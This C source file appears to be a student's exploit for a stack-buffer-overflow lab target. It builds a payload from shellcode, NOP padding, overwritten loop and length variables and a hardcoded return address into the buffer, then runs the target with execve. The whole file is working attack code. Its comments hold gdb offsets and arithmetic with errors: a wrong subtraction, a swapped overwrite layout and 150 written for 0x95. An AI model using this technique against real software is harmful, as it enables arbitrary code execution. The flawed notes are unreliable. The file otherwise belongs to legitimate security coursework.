#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NOP '\x90'

/*
(gdb) info frame
Stack level 0, frame at 0x3021feb0:
 rip = 0x400b85 in foo (target4.c:14); saved rip = 0x400c62
 called by frame at 0x3021fed0
 source language c.
 Arglist at 0x3021fea0, args: arg=0x7fffffffd7bf "test"
 Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
 Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8
(gdb) p & len
$1 = (int *) 0x3021fe9c
(gdb) p & i
$2 = (int *) 0x3021fe98
(gdb) p & buf
$3 = (char (*)[156]) 0x3021fdf0
(gdb) p &a
$4 = (char **) 0x602090 <a>
(gdb) p &b
$5 = (char **) 0x602098 <b>

ea8-df0= 3736- 3456 = 184(decimal)

the total size is 184 +return address(0x3021fdf0)+ ending  = 189

need to overflow the len 169
while is e9c - df0 = 3720-2456 = 172 is greater than 169 and it could not be written and only value i could be 
overwitten and we overite i with a smaller number so that more iteration could be executed 


0-44 shellcode
45 - 167 junk code
168-171 len overwrite keep the same value
172-175 i overwrite for 150 so that the loop could iterate for 189 times 
184-187 new return addreess(adddress of buffer)
188 End of String
*/

int main(void)
{
  char *args[3];
  char *env[6];
  int attacking_buffer_size = 189;
	char attacking_buffer[attacking_buffer_size];

	char return_addr[]="\xf0\xfd\x21\x30";
	char overwrite_len[]= "\xa9\x00\x00\x00";  //169 make sure its the same
	char overwrite_i[]= "\x95\x00\x00\x00";  //150
	
  memset(attacking_buffer , NOP, attacking_buffer_size);

	memcpy(attacking_buffer, shellcode, sizeof(shellcode) - 1);

	memcpy(attacking_buffer + 168, overwrite_i, sizeof(overwrite_i) - 1);

	memcpy(attacking_buffer + 172, overwrite_len, sizeof(overwrite_len) - 1);

	memcpy(attacking_buffer + 184, return_addr, sizeof(return_addr) - 1);	

	//end of buffer
	attacking_buffer[attacking_buffer_size-1] = '\0';

  args[0] = TARGET; 
  args[1] = attacking_buffer; 
  args[2] = NULL;

  env[0] = &attacking_buffer[170];
  env[1] = &attacking_buffer[171];
  env[2] = &attacking_buffer[172];
  env[3] = &attacking_buffer[174];
  env[4] = &attacking_buffer[175];
  env[5] = &attacking_buffer[176];

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}




